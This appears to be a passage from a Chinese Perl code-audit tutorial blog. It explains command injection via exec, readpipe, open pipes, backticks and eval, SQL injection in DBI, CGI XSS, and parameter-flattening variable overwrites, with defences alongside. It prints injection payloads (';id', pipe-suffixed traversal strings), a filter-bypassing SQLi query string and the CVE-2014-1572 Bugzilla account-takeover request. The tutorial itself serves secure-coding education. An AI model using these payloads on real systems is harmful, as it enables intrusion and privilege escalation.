+<h5 id="参数全部可控-1"><a href="#参数全部可控-1" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">"echo exec_inject"</span>;</span><br><span class="line"><span class="keyword">exec</span> $cmd;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/10.png" alt=""></p>
+<h5 id="参数部分可控-1"><a href="#参数部分可控-1" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>和前面system的情况一样，未进行数组分隔时能注入命令执行：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">";id"</span>;</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">"cat /tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/11.png" alt=""></p>
+<p>同样，数组分隔传参就不行了：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">";id"</span>;</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">"echo"</span>, <span class="string">"helloworld$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># @a = ("echo","helloworld$ARGV[0]");</span></span><br><span class="line"><span class="comment"># exec @a;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/12.png" alt=""></p>
+<p>此时可尝试如前面system()函数中讲到的参数注入或者目录遍历，这里不多说。</p>
+<h4 id="readpipe-函数"><a href="#readpipe-函数" class="headerlink" title="readpipe()函数"></a>readpipe()函数</h4><p>readpipe()函数将EXPR作为命令执行，然后返回命令执行后的结果。也就是说，单单运行该函数是获取不到命令执行的回显结果的，需要结合print才能看到回显。</p>
+<h5 id="参数全部可控-2"><a href="#参数全部可控-2" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@result = <span class="keyword">readpipe</span>(<span class="string">"ls -l /tmp"</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"@result"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令无回显</span></span><br><span class="line"><span class="keyword">readpipe</span>(<span class="string">"touch /tmp/perltest/hacked"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/13.png" alt=""></p>
+<h5 id="参数部分可控-2"><a href="#参数部分可控-2" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p><strong>readpipe()函数和前面两个命令执行函数不一样，即使是数组分隔命令和参数传参还是会执行命令！</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@param = (<span class="string">"cat"</span>,<span class="string">"/tmp/;id"</span>);</span><br><span class="line">@result = <span class="keyword">readpipe</span> @param;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"@result"</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/14.png" alt=""></p>
+<h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h4><p>在Perl中open()函数被用来打开文件。该函数最为常见的使用形式如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span> (FILEHANDLE, <span class="string">"filename"</span>);</span><br></pre></td></tr></table></figure>
+<p>在Perl的open()函数中，如果在文件名后加上管道符”|”，则Perl将会执行这个文件，而不是打开它。</p>
+<h5 id="参数全部可控-3"><a href="#参数全部可控-3" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><p>open()函数的filename参数可以在其第一个字符前或最后一个字符后注入管道符来实现命令注入：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span>(STATFILE, <span class="string">"|touch /tmp/perltest/hacked"</span>);</span><br><span class="line"><span class="keyword">open</span>(STATFILE, <span class="string">"touch /tmp/perltest/hacked|"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有回显</span></span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"|id"</span>);</span><br><span class="line"><span class="comment"># 无回显</span></span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"id|"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/15.png" alt=""></p>
+<h5 id="参数部分可控-3"><a href="#参数部分可控-3" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>因为filename一般就是某个文件路径，当filename参数前面已经指定好路径但实现参数拼接时，我们可以使用目录遍历的方法来实现注入：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"/tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/16.png" alt=""></p>
+<p>但如果是有重定向符写死的就不可以注入了，如果filename是含有<code>&gt;</code>标志的前缀，那么它是为输出而打开的，并且如果文件已经存在据就会覆盖原文件；如果含有<code>&gt;&gt;</code>前缀，那么是为追加打开的；前缀<code>&lt;</code>打开文件来进行输入操作，这也是不含前缀的时候的默认方式。比如：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"&lt;"</span>, <span class="string">"/tmp/$param"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$param = <span class="string">"../bin/touch /tmp/perltest/hacked|"</span>;</span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"&lt;/tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>Perl的反引号和PHP的反引号一样，可用于执行系统命令。具体利用场景需要具体分析。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">"whoami"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">`$param`</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/5.png" alt=""></p>
+<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>Perl的eval函数的参数就是一段Perl代码，与PHP以及JS的eval类似，会执行自己语言的代码。</p>
+<p>Perl的eval有两种使用方式，即eval EXPR和eval BLOCK。</p>
+<h5 id="eval-EXPR"><a href="#eval-EXPR" class="headerlink" title="eval EXPR"></a>eval EXPR</h5><p>EXPR即表达式。在执行时， Perl解释器会首先解析表达式的值，然后将表达式值作为一条Perl语句插入当前执行上下文。所以，新生成的语句与eval语句本身具有相同的上下文环境。这种方式中，每次执行eval语句，表达式都会被解析。所以，如果eval EXPR如果出现在循环中，表达式可能会被解析多次。 eval的这种方式使得Perl脚本程序能实时生成和执行代码，从而实现了“动态代码”。</p>
+<p>使用示例：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> <span class="string">"print 'mi1k7ea'"</span>;</span><br><span class="line"><span class="keyword">eval</span> <span class="string">'print $a'</span> . <span class="string">', $b'</span> ;</span><br><span class="line"><span class="keyword">eval</span> <span class="number">1</span> + <span class="number">3</span> ;</span><br><span class="line"><span class="keyword">eval</span> <span class="string">'print '</span> . <span class="string">'$a + $b, "\n"'</span> ;</span><br><span class="line"><span class="keyword">eval</span> $command;<span class="comment">#$command = 'print "mi1k7ea"'</span></span><br><span class="line"><span class="keyword">eval</span> $ARGV[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p>如果eval中的EXPR即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> $ARGV[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p>此时直接注入<code>system(&#39;touch /tmp/perltest/mi1k7ea&#39;)</code>：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/1.png" alt=""></p>
+<h5 id="eval-BLOCK"><a href="#eval-BLOCK" class="headerlink" title="eval BLOCK"></a>eval BLOCK</h5><p>BLOCK即代码块。与第一种方式不同， BLOCK只会被解析一次，然后整个插入当前eval函数所在的执行上下文。由于解析上的性能的优势，以及可以在编译时进行代码语法检查，这种方式通常被作为Perl用来为一段代码提供异常捕捉机制，虽然前一种方式也可以。</p>
+<p>使用示例：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> &#123;<span class="keyword">print</span> $a&#125;;</span><br><span class="line"><span class="keyword">eval</span> &#123;$a = <span class="number">1</span>, $b = <span class="number">2</span>, $c = $a + $b&#125;;</span><br></pre></td></tr></table></figure>
+<p>如果eval中的BLOCK即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> &#123;<span class="keyword">system</span>(<span class="string">"touch /tmp/perltest/mi1k7ea"</span>);&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/17.png" alt=""></p>
+<p>另一种Block调用：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> ( @program,<span class="string">'system("touch /tmp/perltest/mi1k7ea");'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> $exp (@program)</span><br><span class="line">&#123;</span><br><span class="line">    $return = <span class="keyword">eval</span>($exp);</span><br><span class="line">    <span class="keyword">print</span> $return,<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/18.png" alt=""></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>Perl中操作数据库默认就支持预编译，但是如果使用不当同样是存在SQL注入漏洞的。关键在于，没有正确使用占位符<code>?</code>。</p>
+<p>在Perl中可以使用DBI（Database Independent Interface）模块来连接数据库。DBI作为Perl语言中和数据库进行通讯的标准接口，它定义了一系列的方法、变量和常量，提供一个和具体数据库平台无关的数据库持久层。</p>
+<p>DBI相关函数如下：</p>
+<ul>
+<li>connect()函数：用于连接数据库；</li>
+<li>prepare()函数：用于预处理SQL语句；</li>
+<li>execute()函数：用于执行SQL语句；</li>
+<li>finish()函数：用于释放语句句柄；</li>
+<li>disconnect()函数：用于断开数据库连接；</li>
+</ul>
+<p>正确使用预编译占位符的例子：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $host = <span class="string">"localhost"</span>;</span><br><span class="line"><span class="keyword">my</span> $driver = <span class="string">"mysql"</span>;</span><br><span class="line"><span class="keyword">my</span> $database = <span class="string">"test"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序对象的句柄</span></span><br><span class="line"><span class="keyword">my</span> $dsn = <span class="string">"DBI:$driver:database=$database:$host"</span>;</span><br><span class="line"><span class="keyword">my</span> $userid = <span class="string">"root"</span>;</span><br><span class="line"><span class="keyword">my</span> $password = <span class="string">"root"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $username = $ARGV[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, $userid, $password ) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预编译SQL语句，注意占位符?的使用</span></span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = ?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL语句</span></span><br><span class="line">$sth-&gt;execute($username) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环输出所有数据</span></span><br><span class="line"><span class="keyword">while</span> ( <span class="keyword">my</span> @row = $sth-&gt;fetchrow_array() )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">':'</span>, @row).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;disconnect();</span><br></pre></td></tr></table></figure>
+<p>此时预编译会将占位符的内容定死为参数值而不会将其中的某些字符串解释为SQL关键字，也就根源上解决了SQL注入问题：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/19.png" alt=""></p>
+<p>但是，如果没有正确使用预编译占位符，如下代码，在prepare()函数中直接拼接变量，就会同样存在SQL注入问题：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预编译SQL语句，未使用占位符?而是采用变量拼接的方式</span></span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = '$username'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL语句</span></span><br><span class="line">$sth-&gt;execute() <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br></pre></td></tr></table></figure>
+<p>此时就能被SQL注入攻击：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/20.png" alt=""></p>
+<p><strong>结论：在prepare()函数进行预编译操作的时候，需要输入的参数值必须使用占位符，禁止直接使用变量拼接SQL语句。</strong></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS是Web前端最常见的漏洞，Perl中也不缺席，关键还是在于Perl代码有没有进行HTML实体编码或者过滤特殊字符之后再输出到页面上。</p>
+<p>比如下面CGI直接将参数原样不动返回到界面中：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line">$cgi = CGI-&gt;new();</span><br><span class="line"><span class="keyword">print</span> $cgi-&gt;param(<span class="string">'p'</span>);</span><br></pre></td></tr></table></figure>
+<p>此时，就会产生XSS问题：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/36.png" alt=""></p>
+<p>正确防御方法是进行HTML实体编码后再输出页面中：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> CGI::escapeHTML($cgi-&gt;param(<span class="string">'p'</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/37.png" alt=""></p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>Perl语言的一些特性会导致存在一些变量覆盖问题，而变量覆盖往往会导致一些检测机制被绕过或者造成越权漏洞的产生。</p>
+<h4 id="哈希引入数组变量覆盖"><a href="#哈希引入数组变量覆盖" class="headerlink" title="哈希引入数组变量覆盖"></a>哈希引入数组变量覆盖</h4><p>Perl的哈希中如果引入了数组，那么数组将会按键对值的结构扁平展开到哈希中，此时存在变量覆盖漏洞。</p>
+<p>看个Demo，在hash中引入list，其中list包含hash中的一个键user并设置了对应的值admin：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@list = (<span class="string">"member"</span>, <span class="string">"user"</span>, <span class="string">"admin"</span>);</span><br><span class="line"></span><br><span class="line">%hash = (</span><br><span class="line">    <span class="string">"user"</span> =&gt; <span class="string">"mi1k7ea"</span>,</span><br><span class="line">    <span class="string">"password"</span> =&gt; <span class="string">"666"</span>,</span><br><span class="line">    <span class="string">"level"</span> =&gt; @list</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (($k, $v) = <span class="keyword">each</span> %hash) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$k: $v\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出，看到list中的键及值直接覆盖了原有的user键值对：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/21.png" alt=""></p>
+<p>延伸到CGI场景中同理：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new();</span><br><span class="line"></span><br><span class="line">%user_info = (<span class="string">"username"</span> =&gt; $cgi-&gt;param(<span class="string">"username"</span>), <span class="string">"password"</span> =&gt; <span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (($k, $v) = <span class="keyword">each</span> %user_info) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$k: $v\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求<code>/test.cgi?username=guest</code>时，返回结果如下：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/31.png" alt=""></p>
+<p>但是，当传入URL参数的key重复多次时<code>/test.cgi?username=guest&amp;username=username&amp;username=admin</code>，返回结果：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/32.png" alt=""></p>
+<p>看到username参数被数组变量覆盖了。原理同上，即当URL传入多个同名参数时，<code>$cgi-&gt;param()</code>函数返回的是一个列表，输入参数<code>username=test&amp;username=username&amp;username=admin</code>时返回的是<code>(&quot;test&quot;, &quot;username&quot;, &quot;admin&quot;)</code>，此时数组就会和哈希结构进行合并，第一个元素guest则设置成username键的值，剩下的username和admin则单独组成为一对键值，新生成的键值对会覆盖掉原本的username的值为admin了。</p>
+<p><strong>案例——CVE-2014-1572（Bugzilla越权漏洞）</strong></p>
+<p>漏洞代码如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $otheruser = Bugzilla::User-&gt;create(&#123;</span><br><span class="line">    <span class="string">login_name =&gt;</span> $login_name,</span><br><span class="line">    <span class="string">realname   =&gt;</span> $cgi-&gt;param(<span class="string">'realname'</span>),</span><br><span class="line">    <span class="string">cryptpassword =&gt;</span> $password&#125;);</span><br></pre></td></tr></table></figure>
+<p>当提交下面请求内容时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=confirm_new_account&amp;t=[TOKEN]&amp;passwd1=[password]&amp;passwd2=[password]</span><br><span class="line">&amp;realname=test&amp;realname=login_name&amp;realname=admin@bugzilla.org</span><br></pre></td></tr></table></figure>
+<p>此时传递给User-&gt;create()函数的结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    realname =&gt; &apos;test&apos;,</span><br><span class="line">    login_name =&gt; &apos;admin@bugzilla.org&apos;,</span><br><span class="line">    cryptpassword =&gt; $password</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里漏洞根源正式往<code>{}</code>即哈希中传入数组，利用上述的特性导致变量覆盖从而导致越权漏洞的产生。</p>
+<h4 id="数组传参变量覆盖"><a href="#数组传参变量覆盖" class="headerlink" title="数组传参变量覆盖"></a>数组传参变量覆盖</h4><p>Perl的函数参数传递中如果传递的参数类型为数组，那么数组将会直接展开来赋值到对应位置的参数上，此时同样存在变量覆盖漏洞。</p>
+<p>看个Demo，test()函数可传入三个参数，然后分别给其传入不同数量、某个参数类型为数组的参数：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    ($a, $b, $c) = @_;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$a$b$c\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">test((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">test(<span class="number">1</span>, (<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">test(<span class="number">1</span>, (<span class="number">2</span>, <span class="number">3</span>), <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/22.png" alt=""></p>
+<p>可以看到，当传递给子程序的参数即便不够，传递的数组会被展开并赋值给a、b、c三个变量上；最后一个调用的第三个传入参数4并没有赋值给c变量。</p>
+<p>这种数组传参覆盖的特性有啥安全问题？看个例子。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">sqli_filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">my</span> ( $str, $type ) = @_;</span><br><span class="line">    <span class="keyword">defined</span> $str <span class="keyword">or</span> <span class="keyword">return</span> <span class="string">"NULL"</span>;</span><br><span class="line">    <span class="keyword">defined</span> $type &amp;&amp; ( $type == <span class="number">6</span> )</span><br><span class="line">        <span class="keyword">and</span> <span class="keyword">return</span> $str;</span><br><span class="line"></span><br><span class="line">    $str =~ <span class="regexp">s/\\/\\\\/sg</span>;</span><br><span class="line">    $str =~ <span class="regexp">s/\'/\\\'/sg</span>;</span><br><span class="line">	$str =~ <span class="regexp">s/\"/\\\"/sg</span>;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cgi = CGI-&gt;new();</span><br><span class="line"><span class="keyword">my</span> $user = sqli_filter($cgi-&gt;param(<span class="string">'user'</span>));</span><br><span class="line"><span class="keyword">print</span> <span class="string">"User Input After Filter: "</span>.$user.<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $dsn = <span class="string">"DBI:mysql:database=test:localhost"</span>;</span><br><span class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, <span class="string">"root"</span>, <span class="string">"root"</span>) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = '$user'"</span>);</span><br><span class="line">$sth-&gt;execute() <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"SQL Query Result:&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="keyword">my</span> @row = $sth-&gt;fetchrow_array() )&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">':'</span>, @row).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;disconnect();</span><br></pre></td></tr></table></figure>
+<p>这个CGI程序会从Web端接收一个user参数，然后通过自定义的sqli_filter()函数进行SQL注入特殊字符转义处理，最后查询数据库中对应的用户信息（假设为正确使用预编译进行SQL语句处理）。</p>
+<p>正常访问，输入用户名即可查询用户信息：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/33.png" alt=""></p>
+<p>尝试进行SQL注入获取所有用户信息，注入<code>?user=testuser&#39; or 1--+</code>，发现单引号被转义了：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/34.png" alt=""></p>
+<p>结合数组参数变量覆盖，注入<code>?user=testuser&#39; or 1--+&amp;user=6</code>，可以看到成功进行了SQL注入，绕过了sqli_filter的检测过滤：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/35.png" alt=""></p>
+<p>导致sqli_filter被绕过的漏洞根源在于，给该函数传递的是一个数组参数，通过变量覆盖的特性将type变量值给覆盖为了6，从而绕过了检测逻辑。</p>
